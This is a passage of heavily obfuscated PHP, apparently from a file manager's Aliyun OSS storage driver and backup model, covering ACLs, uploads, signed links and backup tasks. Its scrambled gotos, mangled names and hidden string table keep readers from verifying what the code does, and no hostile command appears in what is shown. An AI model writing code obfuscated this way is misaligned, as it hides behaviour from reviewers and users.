$_SERVER[¬ı§†‰ú˜¼]; $a˜¤İ¦ç¨Ö = $this->pathAcl($DÑÚÅÙÈ); return $a˜¤İ¦ç¨Ö == $A†åšç’Š—[1283] || $a˜¤İ¦ç¨Ö == $A†åšç’Š—[518] ? !0 : !1; } public function canWrite($DÒ…®¡¤»¨) { $B†¨œ„¼åË = $this->pathAcl($DÒ…®¡¤»¨); return $B†¨œ„¼åË == $_SERVER[¬ı§†‰ú˜¼][518] ? !0 : !1; } public function pathAcl($B»¸ÀøéñÁ) { goto bØ³òòôâÍ; cîÎÒŞ±Œ»: $b’êÓ‹“Ã¢ = $CÒÇ¿‡µ == $eù“ìéË˜³[34] ? $this->bucketAcl : $CÒÇ¿‡µ; if ($b’êÓ‹“Ã¢ == $eù“ìéË˜³[1284]) { return $eù“ìéË˜³[1283]; } if ($b’êÓ‹“Ã¢ == $eù“ìéË˜³[1285]) { return $eù“ìéË˜³[518]; } goto a«ÜßèÚ¹; a«ÜßèÚ¹: return $b’êÓ‹“Ã¢; goto a¹ÀÍĞîÔ; bØ³òòôâÍ: $eù“ìéË˜³ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $CÒÇ¿‡µ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($B»¸ÀøéñÁ)); } catch (OSS\Core\OssException $dÛ¢¤ğÕ Œ) { return !1; } goto cîÎÒŞ±Œ»; a¹ÀÍĞîÔ: } private function chmodPath($d¹éºéº¥, $F·‡™ñõÁ¸ = '') { $Eìñ‚è’Æ =& $_SERVER[¬ı§†‰ú˜¼]; $cÃ‚¿å¬ª² = empty($F·‡™ñõÁ¸) ? $Eìñ‚è’Æ[1285] : $F·‡™ñõÁ¸; $C„Ú›İ¥ƒ× = array($Eìñ‚è’Æ[34], $Eìñ‚è’Æ[191], $Eìñ‚è’Æ[1284], $Eìñ‚è’Æ[1285]); if (!in_array($cÃ‚¿å¬ª², $C„Ú›İ¥ƒ×)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($d¹éºéº¥), $cÃ‚¿å¬ª²); } catch (OSS\Core\OssException $b»¤¡ÕáŒ) { return !1; } return !0; } public function getContent($Aåçµàõ) { return $this->fileSubstr($Aåçµàõ, -1); } public function setContent($d¸ãÏ–‹Õè, $aô¨Ü“ÒÅÄ = '') { $E‹ÏÖë–© =& $_SERVER[¬ı§†‰ú˜¼]; try { $eÎÇ«È†¬ï = $this->trafficLimit($E‹ÏÖë–©[1286]); $DÈÕ¯‡³Ÿ¢ = $this->client->putObject($this->bucket, $this->pathEncode($d¸ãÏ–‹Õè), $aô¨Ü“ÒÅÄ, $eÎÇ«È†¬ï); } catch (OSS\Core\OssException $aô­ŠÂØ„ò) { return !1; } $døö·˜†–Ë = array($E‹ÏÖë–©[1275] => trim($DÈÕ¯‡³Ÿ¢[$E‹ÏÖë–©[1287]], $E‹ÏÖë–©[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d¸ãÏ–‹Õè))); $this->updateObjMeta($d¸ãÏ–‹Õè, $døö·˜†–Ë); return isset($DÈÕ¯‡³Ÿ¢[$E‹ÏÖë–©[1288]][$E‹ÏÖë–©[1234]]) ? !0 : !1; } private function updateObjMeta($BîóÛ‘”ê³, $eîÛ±‘î¾–) { $BîóÛ‘”ê³ = $this->pathEncode($BîóÛ‘”ê³); try { $aÌë·†Ù¿ê = array(OSS\OssClient::OSS_HEADERS => $eîÛ±‘î¾–); $this->client->copyObject($this->bucket, $BîóÛ‘”ê³, $this->bucket, $BîóÛ‘”ê³, $aÌë·†Ù¿ê); } catch (OSS\Core\OssException $fˆßäò’‡Ï) { return !1; } return !0; } public function upload($cÍ¢Š“™À’, $A“šÈØ²Ô‡, $CÍÎß‚§‚ = false, $a©Œ‹Î‡¤ñ = REPEAT_REPLACE) { $Aè–˜ì¬¥ =& $_SERVER[¬ı§†‰ú˜¼]; $Dğ² —Ïç = trim($cÍ¢Š“™À’, $Aè–˜ì¬¥[8]); $aºÁ¬Ë£‘… = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Aè–˜ì¬¥[1275] => @md5_file($A“šÈØ²Ô‡)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cÍ¢Š“™À’))); $aºÁ¬Ë£‘… = $this->trafficLimit($Aè–˜ì¬¥[1286], $aºÁ¬Ë£‘…); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Dğ² —Ïç), $A“šÈØ²Ô‡, $aºÁ¬Ë£‘…); } catch (OSS\Core\OssException $b´·æ²‚Õå) { return !1; } return $this->getPathOuter($cÍ¢Š“™À’); } public function getHost() { $Eô—È¿‰ =& $_SERVER[¬ı§†‰ú˜¼]; $A­ÁÎó‘»Î = explode($Eô—È¿‰[177], parent::getHost()); return $A­ÁÎó‘»Î[0] . $Eô—È¿‰[177] . $this->bucket . $Eô—È¿‰[95] . $A­ÁÎó‘»Î[1]; } public function uploadFormData($E›Ê¦ĞÅ…é, $fŠª÷òó¤ = 3600) { goto a‰®¶Èœ‰; fœ‡ÂÏ™‘: $CöòìË†­ = date($FÇ¢œÎ³‘“[1289], time() + $CÁ·µ»ÖÛ); $b¸öŞÚĞœ« = new DateTime($CöòìË†­); $a´¯ä¡³à§ = $b¸öŞÚĞœ«->format(DateTime::ISO8601); goto B·Ó³«‘ÃĞ; DÌ¹å„æ: $fÍÙÚõÓ ˜ = base64_encode(hash_hmac($FÇ¢œÎ³‘“[229], $F„¬ğŒŒ®¢, $this->secret, !0)); $Aä´ÒÃø£ = array($FÇ¢œÎ³‘“[1199] => $F„¬ğŒŒ®¢, $FÇ¢œÎ³‘“[1292] => $this->accessKey, $FÇ¢œÎ³‘“[1195] => $FÇ¢œÎ³‘“[1187], $FÇ¢œÎ³‘“[1293] => $fÍÙÚõÓ ˜, $FÇ¢œÎ³‘“[175] => $A™³æïˆ‚­); $Aä´ÒÃø£ = $this->trafficLimit($FÇ¢œÎ³‘“[1286], $Aä´ÒÃø£); goto Cùó‡è¦„Ã; a‰®¶Èœ‰: $FÇ¢œÎ³‘“ =& $_SERVER[¬ı§†‰ú˜¼]; if (!($A™³æïˆ‚­ = $this->getHost())) { return !1; } $CÁ·µ»ÖÛ = $fŠª÷òó¤; goto fœ‡ÂÏ™‘; D„‹¼ï²“„: $AİÄãÀã‹… = $this->pathFather($E›Ê¦ĞÅ…é); $DÍ·ÑÜ¯‘ª = array($FÇ¢œÎ³‘“[1189] => $a´¯ä¡³à§, $FÇ¢œÎ³‘“[1190] => array(array($FÇ¢œÎ³‘“[1291], 0, $c‰²°‡†™§), array($FÇ¢œÎ³‘“[1193], $FÇ¢œÎ³‘“[1194], $AİÄãÀã‹…))); $F„¬ğŒŒ®¢ = base64_encode(json_encode($DÍ·ÑÜ¯‘ª)); goto DÌ¹å„æ; B·Ó³«‘ÃĞ: $e“ø´—œõ = strpos($a´¯ä¡³à§, $FÇ¢œÎ³‘“[293]); $a´¯ä¡³à§ = substr($a´¯ä¡³à§, 0, $e“ø´—œõ) . $FÇ¢œÎ³‘“[1290]; $c‰²°‡†™§ = 1048576000 * 5; goto D„‹¼ï²“„; Cùó‡è¦„Ã: return $Aä´ÒÃø£; goto bĞ¢ŒÚæƒ; bĞ¢ŒÚæƒ: } public function multiUploadFormData($cŞê½í•áœ, $AèåñğÊ¥Æ = 3600) { $Eåˆ¡ ÷ =& $_SERVER[¬ı§†‰ú˜¼]; if (!($CÀÀæ‹…ŒÒ = $this->getHost())) { return !1; } $bô±¤â¡äŠ = $this->trafficLimit($Eåˆ¡ ÷[1286]); $AÄ“Åà´ƒ¸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cŞê½í•áœ), $bô±¤â¡äŠ); return array($Eåˆ¡ ÷[220] => $AÄ“Åà´ƒ¸, $Eåˆ¡ ÷[175] => $CÀÀæ‹…ŒÒ . $Eåˆ¡ ÷[8] . $this->pathEncode($cŞê½í•áœ), $Eåˆ¡ ÷[221] => gmdate($Eåˆ¡ ÷[1294]), $Eåˆ¡ ÷[93] => $cŞê½í•áœ); } public function multiUploadAuthData($CÚª«åÀÏÖ, $CÓÃö¥‹í÷ = array()) { goto c„é¨§ö á; c„é¨§ö á: $a™‘ëˆïïŒ =& $_SERVER[¬ı§†‰ú˜¼]; $F„ì™¾àÑĞ = isset($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[221]]) ? $CÓÃö¥‹í÷[$a™‘ëˆïïŒ[221]] : gmdate($a™‘ëˆïïŒ[1294]); $Bé¹ƒÎá´ = isset($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[168]]) ? $CÓÃö¥‹í÷[$a™‘ëˆïïŒ[168]] : $a™‘ëˆïïŒ[33]; goto eáº§ù…Æƒ; eáº§ù…Æƒ: $f¦Œ•´œ÷Š = $CÚª«åÀÏÖ; if (isset($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[93]])) { $f¦Œ•´œ÷Š = $CÓÃö¥‹í÷[$a™‘ëˆïïŒ[93]]; unset($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[93]]); } if (isset($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[222]])) { $CÓÃö¥‹í÷[$a™‘ëˆïïŒ[221]] = $F„ì™¾àÑĞ; return $this->listUploadParts($f¦Œ•´œ÷Š, $CÓÃö¥‹í÷); } goto dˆ…Ã“á; C× ´ò˜‚: if (!empty($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[1296]])) { $D÷¸½ô¥´Ô = array_merge(array($cŠŒ‹™½òŞ[4]), $CÓÃö¥‹í÷[$a™‘ëˆïïŒ[1296]]); sort($D÷¸½ô¥´Ô); $cŠŒ‹™½òŞ[4] = implode($a™‘ëˆïïŒ[228], $D÷¸½ô¥´Ô); } $AÜ¡®Ïàá¥ = implode($a™‘ëˆïïŒ[228], $cŠŒ‹™½òŞ); $f´Œì©ØÀñ = base64_encode(hash_hmac($a™‘ëˆïïŒ[229], $AÜ¡®Ïàá¥, $this->secret, !0)); goto bŒ‰°í˜ƒî; dˆ…Ã“á: $cŠŒ‹™½òŞ = array($a™‘ëˆïïŒ[223], $a™‘ëˆïïŒ[33], $a™‘ëˆïïŒ[119], $F„ì™¾àÑĞ, "\x78\x2d\157\x73\163\55\x64\141\164\x65\x3a{$F„ì™¾àÑĞ}", $a™‘ëˆïïŒ[8] . $this->bucket . $a™‘ëˆïïŒ[8] . $f¦Œ•´œ÷Š . $Bé¹ƒÎá´); if (strpos($Bé¹ƒÎá´, $a™‘ëˆïïŒ[224]) === 0) { $cŠŒ‹™½òŞ[0] = $a™‘ëˆïïŒ[225]; if ($bÜËîèÀ = $this->trafficLimit($a™‘ëˆïïŒ[1286])) { $f¦Œ•´œ÷Š = $a™‘ëˆïïŒ[1295]; array_splice($cŠŒ‹™½òŞ, 5, 0, $f¦Œ•´œ÷Š . $a™‘ëˆïïŒ[4] . $bÜËîèÀ[$f¦Œ•´œ÷Š]); } } if (isset($CÓÃö¥‹í÷[$a™‘ëˆïïŒ[226]]) && $CÓÃö¥‹í÷[$a™‘ëˆïïŒ[226]] == $a™‘ëˆïïŒ[227]) { $cŠŒ‹™½òŞ[0] = $a™‘ëˆïïŒ[227]; } goto C× ´ò˜‚; bŒ‰°í˜ƒî: $E˜øÂó¿‹ = $a™‘ëˆïïŒ[1259] . $this->accessKey . $a™‘ëˆïïŒ[4] . $f´Œì©ØÀñ; if (strpos($Bé¹ƒÎá´, $a™‘ëˆïïŒ[224]) === 0) { $E˜øÂó¿‹ = array($a™‘ëˆïïŒ[231] => $E˜øÂó¿‹, $a™‘ëˆïïŒ[221] => $F„ì™¾àÑĞ); if ($bÜËîèÀ) { $E˜øÂó¿‹ = array_merge($E˜øÂó¿‹, $bÜËîèÀ); } } return $E˜øÂó¿‹; goto C¦áï˜½ª™; C¦áï˜½ª™: } public function listUploadParts($cÊàë£ŒÊ¢, $EÎ¸´ö¡·¯) { goto A¨«‹ÕĞ°Ø; D×—Ä’áá¹: $Fà¬ÉÓŠ = $cƒ’ºòŒÜê->getListPart(); $eÂÁÙ°„âø = array(); foreach ($Fà¬ÉÓŠ as $AŞÍç”“Å) { $eÂÁÙ°„âø[] = array($dÛªö›ˆ‰Ò[1279] => $AŞÍç”“Å->getPartNumber(), $dÛªö›ˆ‰Ò[1280] => trim($AŞÍç”“Å->getETag(), $dÛªö›ˆ‰Ò[116])); } goto bø‰ê‘å; bø‰ê‘å: unset($EÎ¸´ö¡·¯[$dÛªö›ˆ‰Ò[222]], $EÎ¸´ö¡·¯[$dÛªö›ˆ‰Ò[226]]); $bµëé‰İ¼ = $this->multiUploadAuthData($cÊàë£ŒÊ¢, $EÎ¸´ö¡·¯); if (empty($bµëé‰İ¼)) { return !1; } goto CŠã‡‡ôİñ; A¨«‹ÕĞ°Ø: $dÛªö›ˆ‰Ò =& $_SERVER[¬ı§†‰ú˜¼]; $Dîì¡†Òç = parse_url_query($EÎ¸´ö¡·¯[$dÛªö›ˆ‰Ò[168]]); $cƒ’ºòŒÜê = $this->client->listParts($this->bucket, $this->pathEncode($cÊàë£ŒÊ¢), $Dîì¡†Òç[$dÛªö›ˆ‰Ò[220]]); goto D×—Ä’áá¹; CŠã‡‡ôİñ: return array($dÛªö›ˆ‰Ò[231] => $bµëé‰İ¼, $dÛªö›ˆ‰Ò[221] => $EÎ¸´ö¡·¯[$dÛªö›ˆ‰Ò[221]], $dÛªö›ˆ‰Ò[233] => $eÂÁÙ°„âø); goto aã˜éÄœª—; aã˜éÄœª—: } public function download($cœË½Êˆæ±, $eªñù†»ŒŒ) { if ($this->isFolder($cœË½Êˆæ±)) { return !1; } try { $BÛ‡¿ã÷¯ë = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $eªñù†»ŒŒ); $BÛ‡¿ã÷¯ë = $this->trafficLimit($_SERVER[¬ı§†‰ú˜¼][109], $BÛ‡¿ã÷¯ë); $this->client->getObject($this->bucket, $this->pathEncode($cœË½Êˆæ±), $BÛ‡¿ã÷¯ë); } catch (OSS\Core\OssException $a‘ªÇ‘æ˜­) { return !1; } return $eªñù†»ŒŒ; } public function fileSubstr($D®Îîï¿ª, $A¶¸ï…§Í¹ = 0, $b²†Å»Ê†Å = false) { if ($A¶¸ï…§Í¹ === -1) { $f¦ç˜–¯è” = array(); } else { if ($b²†Å»Ê†Å === !1) { $dêé‡ª‹¡ç = $this->size($D®Îîï¿ª); } else { $dêé‡ª‹¡ç = $A¶¸ï…§Í¹ + $b²†Å»Ê†Å - 1; } $f¦ç˜–¯è” = array(OSS\OssClient::OSS_RANGE => "{$A¶¸ï…§Í¹}\x2d{$dêé‡ª‹¡ç}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($D®Îîï¿ª), $f¦ç˜–¯è”); } catch (OSS\Core\OssException $dˆ¡é¨º¾¹) { think_exception($dˆ¡é¨º¾¹->getMessage()); return !1; } } private function trafficLimit($d¼¸¡«ùƒ©, $C¢…Â¶„§‡ = array()) { goto AîÜÌÉ¯ÂÍ; AîÜÌÉ¯ÂÍ: $Aœ‹¥‘æÂ£ =& $_SERVER[¬ı§†‰ú˜¼]; if ($d¼¸¡«ùƒ© == $Aœ‹¥‘æÂ£[1286] && $this->isUploadServer() || $d¼¸¡«ùƒ© == $Aœ‹¥‘æÂ£[109] && $this->isFileOutServer()) { return $C¢…Â¶„§‡; } $A±ä—Ó´µØ = floatval($GLOBALS[$Aœ‹¥‘æÂ£[6]][$Aœ‹¥‘æÂ£[88]][$Aœ‹¥‘æÂ£[107]][$d¼¸¡«ùƒ©]) * 1024 * 1024 * 8; goto A¬Æ„Œö; DéŸòÖ½Ù: return $C¢…Â¶„§‡; goto CÃƒãƒí…; A¬Æ„Œö: if (!$A±ä—Ó´µØ) { return $C¢…Â¶„§‡; } $A±ä—Ó´µØ = $A±ä—Ó´µØ < 819200 ? 819200 : ($A±ä—Ó´µØ > 838860800 ? 838860800 : $A±ä—Ó´µØ); $C¢…Â¶„§‡[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A±ä—Ó´µØ); goto DéŸòÖ½Ù; CÃƒãƒí…: } public function link($d¢˜íëÊ­, $EÇŠ®çµƒ‡ = array()) { $A¶‚£‚÷İ´ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->exist($d¢˜íëÊ­) || $this->isFolder($d¢˜íëÊ­)) { return !1; } try { $EÇŠ®çµƒ‡ = $this->trafficLimit($A¶‚£‚÷İ´[109], $EÇŠ®çµƒ‡); $AÕÖ¢Îé®¢ = $this->client->signUrl($this->bucket, $this->pathEncode($d¢˜íëÊ­), 3600 * 12, $A¶‚£‚÷İ´[227], $EÇŠ®çµƒ‡); return $this->getCdnLink($AÕÖ¢Îé®¢); } catch (OSS\Core\OssException $cêÖ…¸‰ê—) { return !1; } } public function fileOut($AŒ•÷·¤õµ, $ağä„†æ = false, $E“Á½«¢Ğ = false, $e•–´” = '') { goto e¶¦÷”Ñã; DÎÍ·Ò°º¡: $E“Á½«¢Ğ = rawurlencode($E“Á½«¢Ğ); $F„ğá«Î¯¸ = get_file_mime(get_path_ext($E“Á½«¢Ğ)); if ($F„ğá«Î¯¸ == $Bê¦ŒÆ­ø[212]) { return parent::fileOut($AŒ•÷·¤õµ, $ağä„†æ, $E“Á½«¢Ğ, $e•–´”); } goto eÈ—“Šõ…Ü; Aî¹”¦îÕ: $bµÅ°ê‘‹¿ = $this->link($AŒ•÷·¤õµ, $d¤¬´ñœ÷); $this->fileOutLink($bµÅ°ê‘‹¿); goto fÁƒ¶ß·Æ®; e¶¦÷”Ñã: $Bê¦ŒÆ­ø =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->isFileOutServer()) { return $this->fileOutServer($AŒ•÷·¤õµ, $ağä„†æ, $E“Á½«¢Ğ, $e•–´”); } if (!$E“Á½«¢Ğ) { $E“Á½«¢Ğ = $this->pathThis($AŒ•÷·¤õµ); } goto DÎÍ·Ò°º¡; eÈ—“Šõ…Ü: $ağä„†æ = $ağä„†æ ? $Bê¦ŒÆ­ø[213] : $Bê¦ŒÆ­ø[214]; $d¤¬´ñœ÷ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Bê¦ŒÆ­ø[1297] . rawurlencode("{$ağä„†æ}\x3b\x66\x69\x6c\x65\156\x61\155\145\x3d{$E“Á½«¢Ğ}")); $d¤¬´ñœ÷[OSS\OssClient::OSS_SUB_RESOURCE] .= $Bê¦ŒÆ­ø[1298] . rawurlencode($F„ğá«Î¯¸); goto Aî¹”¦îÕ; fÁƒ¶ß·Æ®: } public function fileOutServer($e˜šğìãšò, $FêÜ¯‚ª¨À = false, $eóø«øÊ¾İ = false, $B‰¸Ù§íÄ­ = '') { parent::fileOut($e˜šğìãšò, $FêÜ¯‚ª¨À, $eóø«øÊ¾İ, $B‰¸Ù§íÄ­); } public function fileOutImage($D´’”‚Æù², $cğ¦Ó´§íÏ = 250) { $CÎ©×ğÚÔ® = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¬ı§†‰ú˜¼][1299] . $cğ¦Ó´§íÏ); $fÅÁÖ’–ì› = $this->link($D´’”‚Æù², $CÎ©×ğÚÔ®); $this->fileOutLink($fÅÁÖ’–ì›); } public function fileOutImageServer($bïòâ†Éá•, $D›‘½Ğœœ¶ = 250) { parent::fileOutImage($bïòâ†Éá•, $D›‘½Ğœœ¶); } public function fileOutLink($a„ñÍèÜ‘‹) { $FØÓï¬·Õ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->isCdnHost() && substr($a„ñÍèÜ‘‹, 0, 7) == $FØÓï¬·Õ[1202]) { $a„ñÍèÜ‘‹ = $FØÓï¬·Õ[1203] . substr($a„ñÍèÜ‘‹, 7); } header($FØÓï¬·Õ[159] . $a„ñÍèÜ‘‹); die; } public function hashMd5($d¤×¢‘Ù…, $eÜ‡ò§“ë“ = '') { $A‚ŠÙ…À¯¸ =& $_SERVER[¬ı§†‰ú˜¼]; $dÏÏ‹Ó ğÌ = $this->_objectMeta($d¤×¢‘Ù…); if (!$dÏÏ‹Ó ğÌ) { return $A‚ŠÙ…À¯¸[33]; } if (!isset($dÏÏ‹Ó ğÌ[$A‚ŠÙ…À¯¸[1275]]) && !empty($eÜ‡ò§“ë“)) { $B´ªÜ¡ØŞ = $this->updateObjMeta($d¤×¢‘Ù…, array($A‚ŠÙ…À¯¸[1275] => $eÜ‡ò§“ë“)); $dÏÏ‹Ó ğÌ[$A‚ŠÙ…À¯¸[1275]] = $B´ªÜ¡ØŞ ? $eÜ‡ò§“ë“ : $A‚ŠÙ…À¯¸[33]; } return isset($dÏÏ‹Ó ğÌ[$A‚ŠÙ…À¯¸[1275]]) ? strtolower($dÏÏ‹Ó ğÌ[$A‚ŠÙ…À¯¸[1275]]) : $A‚ŠÙ…À¯¸[33]; } public function size($cÒá¦’È…İ) { $b©ôí¿âÍ = $this->objectMeta($cÒá¦’È…İ); return $b©ôí¿âÍ ? $b©ôí¿âÍ[$_SERVER[¬ı§†‰ú˜¼][78]] : 0; } public function info($cîğê¬—ëù) { if ($this->isFolder($cîğê¬—ëù)) { return $this->folderInfo($cîğê¬—ëù); } else { if ($this->isFile($cîğê¬—ëù)) { return $this->fileInfo($cîğê¬—ëù); } } return !1; } public function exist($DŸŒëßáòå) { return $this->isFile($DŸŒëßáòå) || $this->isFolder($DŸŒëßáòå); } public function isFile($e”‘‘ï¸šì) { return !$this->isFolder($e”‘‘ï¸šì) && $this->objectMeta($e”‘‘ï¸šì); } public function isFolder($AÏÈáÊõÒ) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][198], $AÏÈáÊõÒ); } protected function objectMeta($bäÂ˜½Å÷ª) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][199], $bäÂ˜½Å÷ª); } protected function _objectMeta($C²Š‚Å™) { $f‰¨µ„¯™ =& $_SERVER[¬ı§†‰ú˜¼]; try { $C›–ºÓ»Å = $this->client->getObjectMeta($this->bucket, $this->pathEncode($C²Š‚Å™)); } catch (OSS\Core\OssException $f•ñ­ó‰‹) { $C›–ºÓ»Å = !1; } if ($C›–ºÓ»Å) { $C›–ºÓ»Å[$f‰¨µ„¯™[78]] = intval($C›–ºÓ»Å[$f‰¨µ„¯™[1273]]); } return $C›–ºÓ»Å; } protected function _isFolder($E²ÜæªĞÛ­) { $bÃîÖˆ¹‡Ü =& $_SERVER[¬ı§†‰ú˜¼]; if ($E²ÜæªĞÛ­ == $bÃîÖˆ¹‡Ü[33] || $E²ÜæªĞÛ­ == $bÃîÖˆ¹‡Ü[8]) { return !0; } $DÉ¾ç¥ÍØ = array($bÃîÖˆ¹‡Ü[1269] => $bÃîÖˆ¹‡Ü[8], $bÃîÖˆ¹‡Ü[1270] => rtrim($E²ÜæªĞÛ­, $bÃîÖˆ¹‡Ü[8]) . $bÃîÖˆ¹‡Ü[8], $bÃîÖˆ¹‡Ü[1271] => 1, $bÃîÖˆ¹‡Ü[1272] => $bÃîÖˆ¹‡Ü[33]); $c¤’ŠáÛ = $this->client->listObjects($this->bucket, $DÉ¾ç¥ÍØ); if ($c¤’ŠáÛ->getObjectList() || $c¤’ŠáÛ->getPrefixList()) { return !0; } return !1; } } goto cØôÔ§±Ÿ; cÁŒ¯Îäç‹: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\142\x61\143\153\x75\x70\114\151\163\164"; public $field = array("\151\x6f", "\156\141\155\145", "\x73\x74\x61\x74\x75\163", "\x63\157\x6e\164\x65\x6e\164", "\162\145\x73\165\154\164", "\164\x69\155\x65\x46\x72\x6f\155", "\164\151\155\x65\x54\157"); public function config() { goto B¸«®áŒÄ‘; EÑñ„Ğ§: $b»¦á„‹È’ = is_array($b»¦á„‹È’) ? $b»¦á„‹È’ : array(); if (!isset($b»¦á„‹È’[$cÒÑÕ·ßê‰[717]])) { $b»¦á„‹È’[$cÒÑÕ·ßê‰[717]] = $cÒÑÕ·ßê‰[87]; } $dè¥´¦¨¼¨ = array(); goto E„Ö…‚Å±; E„Ö…‚Å±: Action($cÒÑÕ·ßê‰[1714])->taskInit(); $d—²ì–¸¾¨ = Model($cÒÑÕ·ßê‰[1715])->listData(); foreach ($d—²ì–¸¾¨ as $d†×È´¥¬¼) { if ($d†×È´¥¬¼[$cÒÑÕ·ßê‰[1169]] == $cÒÑÕ·ßê‰[87] && $d†×È´¥¬¼[$cÒÑÕ·ßê‰[1516]] == $cÒÑÕ·ßê‰[1716]) { $dè¥´¦¨¼¨ = $d†×È´¥¬¼; break; } } goto e†‹–µ¢§­; e†‹–µ¢§­: if (isset($dè¥´¦¨¼¨[$cÒÑÕ·ßê‰[196]])) { $dè¥´¦¨¼¨[$cÒÑÕ·ßê‰[196]] = json_decode($dè¥´¦¨¼¨[$cÒÑÕ·ßê‰[196]], !0); } if (isset($b»¦á„‹È’[$cÒÑÕ·ßê‰[196]])) { $dè¥´¦¨¼¨[$cÒÑÕ·ßê‰[196]][$cÒÑÕ·ßê‰[1501]] = $b»¦á„‹È’[$cÒÑÕ·ßê‰[196]]; unset($b»¦á„‹È’[$cÒÑÕ·ßê‰[196]]); } return array_merge($dè¥´¦¨¼¨, $b»¦á„‹È’); goto B èÇ¬µÓ; B¸«®áŒÄ‘: $cÒÑÕ·ßê‰ =& $_SERVER[¬ı§†‰ú˜¼]; $b»¦á„‹È’ = Model($cÒÑÕ·ßê‰[731])->get($cÒÑÕ·ßê‰[743]); $b»¦á„‹È’ = json_decode($b»¦á„‹È’, !0); goto EÑñ„Ğ§; B èÇ¬µÓ: } public function listData($aâñ©Ô™Ò = false, $Aõ†Õ‰ÅÄ– = "\x6d\x6f\144\151\x66\171\x54\151\155\x65", $EÅğø ÑæÙ = false) { return parent::listData($aâñ©Ô™Ò, $Aõ†Õ‰ÅÄ–, !0); } public function lastItem() { $dé‹¾íŸä = $this->listData(); return !empty($dé‹¾íŸä[0]) ? $dé‹¾íŸä[0] : null; } public function kill($aï»à­î¦) { goto Aîì‘‘ƒ”; Aîì‘‘ƒ”: $d‚ÎŒ²º†· =& $_SERVER[¬ı§†‰ú˜¼]; $dÙÉ¯èé™Á = $this->listData($aï»à­î¦); if (!$dÙÉ¯èé™Á || empty($dÙÉ¯èé™Á[$d‚ÎŒ²º†·[28]])) { return !0; } goto fº–àåÙ; AÇéÙ†ø: $D‡ç…å‘™ø = $dÙÉ¯èé™Á[$d‚ÎŒ²º†·[28]]; $DÚæ±·Òø² = TEMP_FILES . $d‚ÎŒ²º†·[739] . $D‡ç…å‘™ø . $d‚ÎŒ²º†·[8]; IO::remove($DÚæ±·Òø², !1); goto c»¼—ï±Î; c»¼—ï±Î: return $this->remove($aï»à­î¦); goto c©¾ÖÂÑù˜; fº–àåÙ: Task::kill($d‚ÎŒ²º†·[742]); Task::kill($d‚ÎŒ²º†·[772]); Task::kill($d‚ÎŒ²º†·[782]); goto AÇéÙ†ø; c©¾ÖÂÑù˜: } public function remove($AÙéùÍ¸İÄ) { $dÛ³—Š¦á = $this->listData($AÙéùÍ¸İÄ); if (!$dÛ³—Š¦á) { return !0; } return $this->backupRemove($dÛ³—Š¦á); } private function backupRemove($a¡ Ö´ˆÌ ) { parent::remove($a¡ Ö´ˆÌ [$_SERVER[¬ı§†‰ú˜¼][392]]); $E‹à¥½šÀ = $this->backupPath($a¡ Ö´ˆÌ ); IO::remove($E‹à¥½šÀ, !1); return !0; } private function backupPath($AÄİ«ùÒÔÈ) { $d¤¶ÛÕ˜ôÙ =& $_SERVER[¬ı§†‰ú˜¼]; $f­ÄëàÎÈ• = $AÄİ«ùÒÔÈ[$d¤¶ÛÕ˜ôÙ[28]]; $dôÕ’†’î = Model($d¤¶ÛÕ˜ôÙ[731])->get($d¤¶ÛÕ˜ôÙ[732]); $b´‰œì³‹ = substr(md5($d¤¶ÛÕ˜ôÙ[733] . $dôÕ’†’î . $f­ÄëàÎÈ•), 0, 8); return "\173\151\x6f\72{$AÄİ«ùÒÔÈ[$d¤¶ÛÕ˜ôÙ[716]]}\x7d\x2f\x64\141\164\x61\x62\x61\x73\145\57\142\x61\143\x6b\x75\x70\x2f" . $f­ÄëàÎÈ• . $d¤¶ÛÕ˜ôÙ[71] . $b´‰œì³‹; } public function start() { goto D“Ïõ†ù; bÏóÚ¾ö¬Å: if ($Aƒôéô±…«) { $Aƒôéô±…« = $e†êğÑéÃ->dbFile(); if ($Aƒôéô±…« && $cÅÃÓâêÂ»[$C¼äŸ’íŒ[717]] == $C¼äŸ’íŒ[495]) { $Aƒôéô±…« = $e†êğÑéÃ->file(); } } Backup::set(array($C¼äŸ’íŒ[714] => 1, $C¼äŸ’íŒ[474] => time())); return !0; goto A÷Á©¦‹…†; D“Ïõ†ù: $C¼äŸ’íŒ =& $_SERVER[¬ı§†‰ú˜¼]; if ($GLOBALS[$C¼äŸ’íŒ[6]][$C¼äŸ’íŒ[88]][$C¼äŸ’íŒ[1717]] != $C¼äŸ’íŒ[87]) { return !0; } $cÅÃÓâêÂ» = $this->config(); goto dÙĞã‡»í; CÂö¦ÃÑîô: $e†êğÑéÃ = new Backup(); $e†êğÑéÃ->keep(); $Aƒôéô±…« = $e†êğÑéÃ->db(); goto bÏóÚ¾ö¬Å; dÙĞã‡»í: if (!$cÅÃÓâêÂ» || $cÅÃÓâêÂ»[$C¼äŸ’íŒ[1498]] != $C¼äŸ’íŒ[87]) { return !1; } $Bùß´×Õİñ = $this->process(); foreach ($Bùß´×Õİñ as $CäƒÍóÅ) { if ($CäƒÍóÅ) { return 